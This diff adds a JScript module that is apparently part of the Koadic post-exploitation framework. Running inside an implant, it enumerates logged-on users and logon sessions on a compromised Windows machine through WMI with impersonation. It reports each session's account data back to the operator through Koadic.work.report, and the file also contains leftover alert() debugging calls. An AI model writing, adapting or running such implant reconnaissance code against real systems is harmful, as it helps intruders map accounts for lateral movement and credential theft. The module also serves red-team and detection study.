@@ -1,0 +1,50 @@
+function stringify_user(user, loggedOn)
+{
+    var ret = "";
+    ret += user.Caption + "\n";
+    ret += user.Description + "\n";
+    ret += user.InstallDate + "\n";
+    ret += user.Name + "\n";
+    ret += user.Status + "\n";
+    ret += user.StartTime + "\n";
+    ret += user.AuthenticationPackage + "\n";
+    ret += user.LogonId + "\n";
+    ret += user.LogonType + "\n";
+
+    ret += loggedOn.Properties_;
+    ret += loggedOn.Name;
+    ret += loggedOn.Antecedent;
+    ret += loggedOn.Dependent;
+
+    return ret;
+}
+
+try {
+    var wmi = GetObject("winmgmts:{impersonationLevel=impersonate}!\\\\.\\root\\cimv2");
+    var columns = wmi.ExecQuery("Select * From Win32_LoggedOnUser");
+
+    for (var e = new Enumerator(columns); !e.atEnd(); e.moveNext())
+    {
+        var session = e.item();
+        var str = session.Antecedent+ "\n" + session.Dependent;
+        //var str = stringify_user(session, eAssoc);
+        alert(str)
+        //var assocs = wmi.ExecQuery("Associators of {Win32_LogonSession.LogonId=" + session.LogonId + "} Where AssocClass=Win32_LoggedOnUser Role=Dependent");
+
+
+        //for (var eAssoc = new Enumerator(assocs); !eAssoc.atEnd(); eAssoc.moveNext())
+        //{
+        //    var str = stringify_user(session, eAssoc);
+        //    alert(str)
+        //}
+
+        Koadic.work.report(str);
+    }
+
+    Koadic.work.report("done");
+} catch (e) {
+    alert(e)
+    Koadic.work.error(e);
+}
+
+Koadic.exit();
